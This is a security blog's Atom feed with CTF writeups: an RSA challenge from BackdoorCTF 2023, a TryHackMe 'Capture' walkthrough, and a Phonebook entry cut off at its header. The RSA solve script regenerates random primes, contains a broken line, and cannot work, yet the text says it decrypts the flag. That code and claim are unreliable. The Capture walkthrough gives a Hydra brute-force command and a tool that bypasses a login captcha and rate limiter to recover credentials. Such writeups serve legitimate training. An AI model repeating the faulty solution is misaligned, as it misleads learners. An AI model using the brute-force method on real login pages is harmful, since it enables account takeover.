<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/">
    <title>Offens!ve Blogs - Sakibul Ali Khan</title>
    <link href="https://sakibulalikhan.pages.dev/feed.xml" rel="self" />
    <link href="https://sakibulalikhan.pages.dev" />
    <updated>2024-01-29T16:56:52+06:00</updated>
    <author>
        <name>Sakibul Ali Khan</name>
    </author>
    <id>https://sakibulalikhan.pages.dev</id>

    <entry>
        <title>BackdoorCTF 2023 — mini_RSA Challenge Writeup</title>
        <author>
            <name>Sakibul Ali Khan</name>
        </author>
        <link href="https://sakibulalikhan.pages.dev/backdoorctf-2023-mini_rsa-challenge-writeup.html"/>
        <id>https://sakibulalikhan.pages.dev/backdoorctf-2023-mini_rsa-challenge-writeup.html</id>
        <media:content url="https://sakibulalikhan.pages.dev/media/posts/10/BackdoorCTF-2023-mini_RSA-Challenge-Writeup.png" medium="image" />
            <category term="RSA"/>
            <category term="Python"/>
            <category term="Crypto"/>
            <category term="CTF Writeups"/>
            <category term="Backdoorctf 2023"/>

        <updated>2024-01-07T10:55:56+06:00</updated>
            <summary>
                <![CDATA[
                        <img src="https://sakibulalikhan.pages.dev/media/posts/10/BackdoorCTF-2023-mini_RSA-Challenge-Writeup.png" alt="BackdoorCTF 2023 — mini_RSA Challenge Writeup" />
                    reetings, fellow cybersecurity enthusiasts and CTF players! In this writeup, we will dive into the solution of the “mini_RSA” challenge from the BackdoorCTF 2023. Groot&hellip;
                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                    <p><img src="https://sakibulalikhan.pages.dev/media/posts/10/BackdoorCTF-2023-mini_RSA-Challenge-Writeup.png" class="type:primaryImage" alt="BackdoorCTF 2023 — mini_RSA Challenge Writeup" /></p>
                <p id="fd65" class="pw-post-body-paragraph mr ms gr mt b mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no gk bj ot" data-selectable-paragraph="">reetings, fellow cybersecurity enthusiasts and CTF players! In this writeup, we will dive into the solution of the “mini_RSA” challenge from the BackdoorCTF 2023.</p>
<figure class="pd pe pf pg ph mp mh mi paragraph-image">
<div class="pi pj fg pk bg pl" tabindex="0" role="button">
<div class="mh mi amo"><figure class="bg lo mq c"><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img  src="https://miro.medium.com/v2/resize:fit:700/1*mN-RcjmqlEvyxQruV5Q1ZQ.png" alt="BackdoorCTF 2023 — mini_RSA Challenge Writeup by sakibulalikhan" width="700" height="264" loading="eager" data-is-external-image="true"></figure></picture></div>
</div>
</figure>
<h1 id="9504" class="np nq gr be nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om bj" data-selectable-paragraph="">Challenge Overview</h1>
<p id="3af4" class="pw-post-body-paragraph mr ms gr mt b mu on mw mx my oo na nb nc op ne nf ng oq ni nj nk or nm nn no gk bj" data-selectable-paragraph="">Groot has encrypted a message using RSA with a key size of 512 bits and a public exponent (RSA_E) of 3. The challenge provides two files: <code class="cw amp amq amr po b">script.py</code> and <code class="cw amp amq amr po b">output.txt</code>. The former contains the RSA encryption script used by Groot, while the latter presents the output ciphertext (c) and the modulus (n).</p>
<p id="b79b" class="pw-post-body-paragraph mr ms gr mt b mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no gk bj" data-selectable-paragraph="">Let’s explore the provided files and understand the challenge before revealing the solution.</p>
<h1 id="ef6e" class="np nq gr be nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om bj" data-selectable-paragraph="">The Encryption Script: script.py</h1>
<pre class="pd pe pf pg ph pn po pp bo pq ba bj"><span id="cc79" class="pr nq gr po b bf ps pt l pu pv" data-selectable-paragraph=""><span class="hljs-comment"># Import necessary modules</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime, bytes_to_long, GCD<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># Set the seed for randomness</span><br>random.seed(time.time())<br><br><span class="hljs-comment"># Define the flag to be encrypted (flag{REDACTED})</span><br>flag = <span class="hljs-string">b"flag{REDACTED}"</span><br><br><span class="hljs-comment"># Define RSA parameters</span><br>KEY_SIZE = <span class="hljs-number">512</span><br>RSA_E = <span class="hljs-number">3</span><br><br><span class="hljs-comment"># Function for fast modular exponentiation</span><br><span class="hljs-keyword">def</span> <span class="hljs-title.function">fast_exp</span>(<span class="hljs-params">a, b, n</span>):<br>    output = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> b &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">if</span> b &amp; <span class="hljs-number">1</span>:<br>            output = output * a % n<br>        a = a * a % n<br>        b &gt;&gt;= <span class="hljs-number">1</span> <br>    <span class="hljs-keyword">return</span> output    <br><br><span class="hljs-comment"># Function to check RSA parameters</span><br><span class="hljs-keyword">def</span> <span class="hljs-title.function">check</span>(<span class="hljs-params">p, q, n</span>):<br>    a_ = random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>)<br>    b_ = random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>)<br>    s = fast_exp(p, fast_exp(q, a_, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)), n)<br>    t = fast_exp(q, fast_exp(p, b_, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)), n)<br>    result = s + t<br>    <span class="hljs-built_in">print</span>(result)<br><br><span class="hljs-comment"># Function to generate RSA parameters</span><br><span class="hljs-keyword">def</span> <span class="hljs-title.function">gen_RSA_params</span>(<span class="hljs-params">N, e</span>):<br>    p = getPrime(N)<br>    q = getPrime(N)<br><br>    <span class="hljs-keyword">while</span> GCD(e, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)) &gt; <span class="hljs-number">1</span>:<br>        p = getPrime(N)<br>        q = getPrime(N)<br><br>    n = p * q<br><br>    check(p, q, n) <br>    <span class="hljs-keyword">return</span> (p, q, n)<br><br><span class="hljs-comment"># Generate RSA parameters and encrypt the flag</span><br>p, q, n = gen_RSA_params(KEY_SIZE, RSA_E) <br>m = bytes_to_long(flag)<br>c = <span class="hljs-built_in">pow</span>(m, RSA_E, n)<br><br><span class="hljs-comment"># Print the ciphertext and modulus</span><br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-built_in">print</span>(n)</span></pre>
<p id="7357" class="pw-post-body-paragraph mr ms gr mt b mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no gk bj" data-selectable-paragraph="">This script generates random prime numbers <code class="cw amp amq amr po b">p</code> and <code class="cw amp amq amr po b">q</code>, checks some conditions, and then encrypts the flag using RSA. The <code class="cw amp amq amr po b">check</code> function is there to create a side channel but is not relevant to our solution.</p>
<h1 id="2e1d" class="np nq gr be nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om bj" data-selectable-paragraph="">The Output File: output.txt</h1>
<pre class="pd pe pf pg ph pn po pp bo pq ba bj"><span id="d5ba" class="pr nq gr po b bf ps pt l pu pv" data-selectable-paragraph="">s+t=24986288511406610689718446624210347240800254679541887917496550238025724025245366296475758347972917098615315083893786596239213463034880126152583583770452304<br>c=5926440800047066468184992240057621921188346083131741617482777221394411358243130401052973132050605103035491365016082149869814064434831123043357292949645845605278066636109516907741970960547141266810284132826982396956610111589<br>n=155735289132981544011017189391760271645447983310532929187034314934077442930131653227631280820261488048477635481834924391697025189196282777696908403230429985112108890167443195955327245288626689006734302524489187183667470192109923398146045404320502820234742450852031718895027266342435688387321102862096023537079</span></pre>
<p id="8a85" class="pw-post-body-paragraph mr ms gr mt b mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no gk bj" data-selectable-paragraph="">The output file provides the sum of two exponentiations <code class="cw amp amq amr po b">s+t</code>, the ciphertext <code class="cw amp amq amr po b">c</code>, and the modulus <code class="cw amp amq amr po b">n</code>.</p>
<h1 id="f6a5" class="np nq gr be nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om bj" data-selectable-paragraph="">My Solution Script: solve.py</h1>
<pre class="pd pe pf pg ph pn po pp bo pq ba bj"><span id="eb44" class="pr nq gr po b bf ps pt l pu pv" data-selectable-paragraph=""><span class="hljs-comment"># Import necessary modules</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long, long_to_bytes, getPrime, GCD<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># Function for fast modular exponentiation</span><br><span class="hljs-keyword">def</span> <span class="hljs-title.function">fast_exp</span>(<span class="hljs-params">a, b, n</span>):<br>    output = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> b &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">if</span> b &amp; <span class="hljs-number">1</span>:<br>            output = output * a % n<br>        a = a * a % n<br>        b &gt;&gt;= <span class="hljs-number">1</span> <br>    <span class="hljs-keyword">return</span> output<br><br><span class="hljs-comment"># Function to check RSA parameters (not used in the solution)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title.function">check</span>(<span class="hljs-params">p, q, n</span>):<br>    a_ = random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>)<br>    b_ = random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>)<br>    s = fast_exp(p, fast_exp(q, a_, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)), n)<br>    t = fast_exp(q, fast_exp(p, b_, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)), n)<br>    result = s + t<br>    <span class="hljs-built_in">print</span>(result)<br><br><span class="hljs-comment"># Function to generate RSA parameters</span><br><span class="hljs-keyword">def</span> <span class="hljs-title.function">gen_RSA_params</span>(<span class="hljs-params">N, e</span>):<br>    p = getPrime(N)<br>    q = getPrime(N)<br><br>    <span class="hljs-keyword">while</span> GCD(e, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)) &gt; <span class="hljs-number">1</span>:<br>        p = getPrime(N)<br>        q = getPrime(N)<br><br>    n = p * q<br><br>    check(p, q, n) <br>    <span class="hljs-keyword">return</span> (p, q, n)<br><br><span class="hljs-comment"># Values from the output.txt</span><br>s_plus_t = <span class="hljs-number">24986288511406610689718446624210347240800254679541887917496550238025724025245366296475758347972917098615315083893786596239213463034880126152583583770452304</span><br>c = <span class="hljs-number">5926440800047066468184992240057621921188346083131741617482777221394411358243130401052973132050605103035491365016082149869814064434831123043357292949645845605278066636109516907741970960547141266810284132826982396956610111589</span><br>n = <span class="hljs-number">155735289132981544011017189391760271645447983310532929187034314934077442930131653227631280820261488048477635481834924391697025189196282777696908403230429985112108890167443195955327245288626689006734302524489187183667470192109923398146045404320502820234742450852031718895027266342435688387321102862096023537079</span><br><br><span class="hljs-comment"># Generate RSA parameters</span><br>p, q, n = gen_RSA_params(<span class="hljs-number">512</span>, <span class="hljs-number">3</span>)<br><br><span class="hljs-comment"># Calculate phi(n)</span><br>phi_n = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># Calculate the modular inverse of e (RSA_E) modulo phi_n</span><br>d = <span class="hljs-built_in">pow</span>(<span class="hljs-number">3</span>, -<span class="hljs-number">1</span>, phi<br><br>_n)<br><br><span class="hljs-comment"># Decrypt the ciphertext</span><br>m_decrypted = <span class="hljs-built_in">pow</span>(c, d, n)<br><br><span class="hljs-comment"># Convert the decrypted message from long to bytes</span><br>flag_decrypted = long_to_bytes(m_decrypted)<br><br><span class="hljs-comment"># Print the decrypted flag</span><br><span class="hljs-built_in">print</span>(flag_decrypted.decode(<span class="hljs-string">'utf-8'</span>))</span></pre>
<h1 id="e66d" class="np nq gr be nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om bj" data-selectable-paragraph="">Explanation and Solution</h1>
<p id="d486" class="pw-post-body-paragraph mr ms gr mt b mu on mw mx my oo na nb nc op ne nf ng oq ni nj nk or nm nn no gk bj" data-selectable-paragraph="">The provided script uses RSA encryption with a small public exponent (<code class="cw amp amq amr po b">e = 3</code>). To solve this challenge, we can use the provided ciphertext (<code class="cw amp amq amr po b">c</code>), modulus (<code class="cw amp amq amr po b">n</code>), and the knowledge that <code class="cw amp amq amr po b">e = 3</code> to decrypt the message.</p>
<p id="a384" class="pw-post-body-paragraph mr ms gr mt b mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no gk bj" data-selectable-paragraph="">The <code class="cw amp amq amr po b">solve.py</code> script first generates new RSA parameters (<code class="cw amp amq amr po b">p</code>, <code class="cw amp amq amr po b">q</code>, <code class="cw amp amq amr po b">n</code>) using the <code class="cw amp amq amr po b">gen_RSA_params</code> function. However, the generated values are not used since we already have the correct values from <code class="cw amp amq amr po b">output.txt</code>.</p>
<p id="2344" class="pw-post-body-paragraph mr ms gr mt b mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no gk bj" data-selectable-paragraph="">The script then calculates <code class="cw amp amq amr po b">phi(n)</code>, the modular inverse of <code class="cw amp amq amr po b">e</code> (RSA_E) modulo <code class="cw amp amq amr po b">phi(n)</code>, and finally decrypts the ciphertext using modular exponentiation. The decrypted flag is then printed.</p>
<h1 id="a60a" class="np nq gr be nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om bj" data-selectable-paragraph="">Conclusion</h1>
<p id="af19" class="pw-post-body-paragraph mr ms gr mt b mu on mw mx my oo na nb nc op ne nf ng oq ni nj nk or nm nn no gk bj" data-selectable-paragraph="">And there you have it! We successfully decrypted Groot’s message and unveiled the hidden flag. The mini_RSA challenge provided a beginner-friendly introduction to RSA encryption and the importance of securely generating key pairs.</p>
<p id="54a6" class="pw-post-body-paragraph mr ms gr mt b mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no gk bj" data-selectable-paragraph="">Feel free to explore the provided scripts and experiment with different RSA concepts to deepen your understanding of cryptography. Happy hacking, and may the challenges keep coming!</p>
<p id="53aa" class="pw-post-body-paragraph mr ms gr mt b mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no gk bj" data-selectable-paragraph=""><em class="ams">Written by sakibulalikhan of </em><a class="af os" href="https://ctftime.org/team/188318" rel="noopener ugc nofollow" target="_blank"><em class="ams">HiddenInvestigations</em></a><em class="ams"> for BackdoorCTF 2023.</em></p>
            ]]>
        </content>
    </entry>
    <entry>
        <title>Capture TryHackMe Writeup</title>
        <author>
            <name>Sakibul Ali Khan</name>
        </author>
        <link href="https://sakibulalikhan.pages.dev/capture-tryhackme-writeup.html"/>
        <id>https://sakibulalikhan.pages.dev/capture-tryhackme-writeup.html</id>
        <media:content url="https://sakibulalikhan.pages.dev/media/posts/9/Capture-TryHackMe-Writeup-2.png" medium="image" />
            <category term="Web Security"/>
            <category term="TryHackMe"/>
            <category term="Python"/>
            <category term="Pentesting"/>
            <category term="Offensive Programming"/>
            <category term="Hacking Tools"/>
            <category term="CTF Writeups"/>

        <updated>2024-01-29T16:26:18+06:00</updated>
            <summary>
                <![CDATA[
                        <img src="https://sakibulalikhan.pages.dev/media/posts/9/Capture-TryHackMe-Writeup-2.png" alt="Capture TryHackMe Writeup" />
                    SecureSolaCoders has once again developed a web application. They were tired of hackers enumerating and exploiting their previous login form. They thought a Web Application&hellip;
                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                    <p><img src="https://sakibulalikhan.pages.dev/media/posts/9/Capture-TryHackMe-Writeup-2.png" class="type:primaryImage" alt="Capture TryHackMe Writeup" /></p>
                <div class="post__entry">
<p id="c45e" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj" data-selectable-paragraph="">SecureSolaCoders has once again developed a web application. They were tired of hackers enumerating and exploiting their previous login form. They thought a Web Application Firewall (WAF) was too overkill and unnecessary, so they developed their own rate limiter and modified the code slightly<strong class="lk fp">.</strong></p>
<p id="5273" class="mg mh fo be mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd bj"><strong>Difficulty = </strong>Easy</p>
<p id="3b4f" class="pw-post-body-paragraph li lj fo lk b ll ne ln lo lp nf lr ls lt ng lv lw lx nh lz ma mb ni md me mf fh bj"><strong class="lk fp">Challenges: </strong><span class="lk fp">Authentication Bypass, Login Bruteforce, Regex, Custom Python Scripting.</span></p>
<p id="014c" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj" data-selectable-paragraph="">TryHackMe Room Link: <a class="af nj" href="https://tryhackme.com/room/capture" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/capture</a></p>
<p id="fb69" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj nk dropcap" data-selectable-paragraph=""><span class="l nl nm nn bn no np nq nr ns eb">W</span>ell, In Task 1 we got some general information and a task file that contains a list of usernames and a list with passwords.</p>
<figure class="nu nv nw nx ny lf kx ky paragraph-image">
<div class="nz oa eb ob bg oc" tabindex="0" role="button">
<div class="kx ky nt">
<figure class="bg lg lh c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*xlAzpuvtgclCW3WlMwogXg.png" alt="Capture Capture TryHackMe Writeup" width="700" height="379" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="70dd" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj" data-selectable-paragraph="">Now let’s start the application and load up the main page to see what’s going on.</p>
<figure class="nu nv nw nx ny lf kx ky paragraph-image">
<div class="nz oa eb ob bg oc" tabindex="0" role="button">
<div class="kx ky nt">
<figure class="bg lg lh c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*9Fli7uwoSUcRsXtVkG8Erg.png" alt="Capture TryHackMe Writeup" width="700" height="178" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="c319" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj" data-selectable-paragraph="">Loading up the main website <a class="af nj" href="http://machine_ip/" rel="noopener ugc nofollow" target="_blank"><strong class="lk fp">http://MACHINE_IP</strong></a>, we can see an “Intranet login” page.</p>
<p id="0a65" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj" data-selectable-paragraph="">With the passwords and usernames list we have it’s safe to assume this will be a brute-force attack.</p>
<figure class="nu nv nw nx ny lf kx ky paragraph-image">
<div class="nz oa eb ob bg oc" tabindex="0" role="button">
<div class="kx ky od">
<figure class="bg lg lh c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*iVc2rJVegHTG4Awrbe5xnA.png" alt="Capture TryHackMe Writeup" width="700" height="173" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="311d" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj" data-selectable-paragraph="">So we’re supposed to beat the self-made rate limiter. Checking the request in Burp doesn’t show any header related to the rate limit. Let’s spin up Hydra.</p>
<pre class="nu nv nw nx ny oe of og bo oh ba bj"><span id="9679" class="oi mh fo of b bf oj ok l ol om" data-selectable-paragraph="">sudo hydra -L usernames.txt -P passwords.txt 10.10.22.8 http-post-form <span class="hljs-string">"/login:username=^USER^&amp;password=^PASS^:Error"</span> -v -t 40</span></pre>
<p id="4706" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj" data-selectable-paragraph="">This returns without any results, I checked the website again and I got a <strong class="lk fp">Captcha Enabled</strong> message showing up with a Captcha to solve.</p>
<figure class="nu nv nw nx ny lf kx ky paragraph-image">
<div class="nz oa eb ob bg oc" tabindex="0" role="button">
<div class="kx ky on">
<figure class="bg lg lh c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*fVvF-OiskmCOUrlAqlCuCA.png" alt="Capture TryHackMe Writeup" width="700" height="251" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="2622" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj" data-selectable-paragraph="">This captcha is simple to beat. We have to write a Python script that requests the page, solves the captcha, and posts the data with the correct captcha.</p>
<p id="b104" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj" data-selectable-paragraph="">To ease your task, I made a full-featured Python tool. you can use that to solve this room. For automation, you can use that. <strong class="lk fp">But strongly recommend that you review my code to understand how the script works.</strong></p>
<h3 id="ea79" class="mg mh fo be mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd bj">Exploitation Part:</h3>
<p id="6f74" class="pw-post-body-paragraph li lj fo lk b ll ne ln lo lp nf lr ls lt ng lv lw lx nh lz ma mb ni md me mf fh bj" data-selectable-paragraph="">Open your <em>terminal</em> and clone this repository to your device.</p>
<div class="oo op oq or os ot">
<div class="ou ab hm">
<div class="ov ab cn ca ow ox">
<h6 class="be fp hj z oy oz pa pb pc pd pe fn bj"><a href="https://github.com/sakibulalikhan/thm-capture" target="_blank" rel="noopener noreferrer">GitHub Repo Link</a></h6>
</div>
</div>
</div>
<pre class="nu nv nw nx ny oe of og bo oh ba bj"><span id="88e7" class="oi mh fo of b bf oj ok l ol om" data-selectable-paragraph="">git <span class="hljs-built_in">clone</span> https://github.com/sakibulalikhan/thm-capture</span></pre>
<p id="69b9" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj" data-selectable-paragraph="">Then enter the folder and install the requirements.</p>
<pre class="nu nv nw nx ny oe of og bo oh ba bj"><span id="0396" class="oi mh fo of b bf oj ok l ol om" data-selectable-paragraph=""><span class="hljs-built_in">cd</span> thm-capture<br>pip install -r requirements.txt</span></pre>
<p id="48b7" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj" data-selectable-paragraph="">Now time to exploit! For exploitation, you just use the<em> “-t” flag</em> to specify the target, and after ‘-t’ enter the URL and wait for it to finish the task. This tool also provides you with the flag!!!!!! Are you serious? yes, yes.</p>
<pre class="nu nv nw nx ny oe of og bo oh ba bj"><span id="9fa0" class="oi mh fo of b bf oj ok l ol om" data-selectable-paragraph="">python capture.py -t <span class="hljs-variable">$IP</span><br><br>Example: python capture.py -t 10.10.22.8</span></pre>
<figure class="nu nv nw nx ny lf kx ky paragraph-image">
<div class="nz oa eb ob bg oc" tabindex="0" role="button">
<div class="kx ky pn">
<figure class="bg lg lh c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*oOJY6QJ9LEuIigHQVLdC5Q.png" alt="Capture TryHackMe Writeup" width="700" height="592" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="3edd" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj" data-selectable-paragraph="">Isn’t it amazing? You got a <strong>username</strong>, <strong>password</strong>, and <strong>precious flag!!!!!</strong><br>The results are there, but you’ll have to find them yourself!</p>
<figure class="nu nv nw nx ny lf kx ky paragraph-image">
<div class="nz oa eb ob bg oc" tabindex="0" role="button">
<div class="kx ky po">
<figure class="bg lg lh c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*q9mQ7R9azkbCGxsPTcHDAA.png" alt="Capture TryHackMe Writeup" width="700" height="482" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p data-selectable-paragraph="">You can check this links:</p>
<ul>
<li><a href="https://github.com/sakibulalikhan/thm-capture">https://github.com/sakibulalikhan/thm-capture</a></li>
<li><a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Authentication_Cheat_Sheet.md#authentication-and-error-messages" target="_blank" rel="noopener noreferrer">OWASP Authentication Cheat Sheet</a></li>
<li><a href="https://requests.readthedocs.io/en/latest/user/quickstart/" target="_blank" rel="noopener noreferrer">Quickstart Python Requests</a></li>
<li><a href="https://pythex.org/">https://pythex.org/</a></li>
</ul>
<p id="98e4" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj" data-selectable-paragraph=""><strong class="lk fp">Thanks for Reading!!</strong></p>
<p id="cf24" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj" data-selectable-paragraph=""><strong class="lk fp">Follow me on Twitter</strong>: <a class="af nj" href="https://twitter.com/sakibulalikhan" rel="noopener ugc nofollow" target="_blank">https://twitter.com/sakibulalikhan</a></p>
<p id="183c" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj" data-selectable-paragraph=""><strong class="lk fp">Happy Capture~</strong></p>
</div>
            ]]>
        </content>
    </entry>
    <entry>
        <title>Phonebook — HTB Web Challenge Writeup</title>
        <author>
            <name>Sakibul Ali Khan</name>
        </author>
        <link href="https://sakibulalikhan.pages.dev/phonebook-htb-web-challenge-writeup.html"/>
        <id>https://sakibulalikhan.pages.dev/phonebook-htb-web-challenge-writeup.html</id>
        <media:content url="https://sakibulalikhan.pages.dev/media/posts/8/Phonebook-HTB-Web-Challenge-Writeup1.png" medium="image" />
            <category term="Web Security"/>
            <category term="Pentesting"/>
            <category term="HackTheBox"/>
            <category term="CTF Writeups"/>

        <updated>2024-01-29T16:56:52+06:00</updated>
            <summary>
                <![CDATA[
                        <img src="https://sakibulalikhan.pages.dev/media/posts/8/Phonebook-HTB-Web-Challenge-Writeup1.png" alt="Phonebook — HTB Web Challenge Writeup" />
                    CHALLENGE DESCRIPTION Who is lucky enough to be included in the phonebook? In the beginning, we first visit the web page and got a login&hellip;
                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                    <p><img src="https://sakibulalikhan.pages.dev/media/posts/8/Phonebook-HTB-Web-Challenge-Writeup1.png" class="type:primaryImage" alt="Phonebook — HTB Web Challenge Writeup" /></p>
                <div class="post__entry">
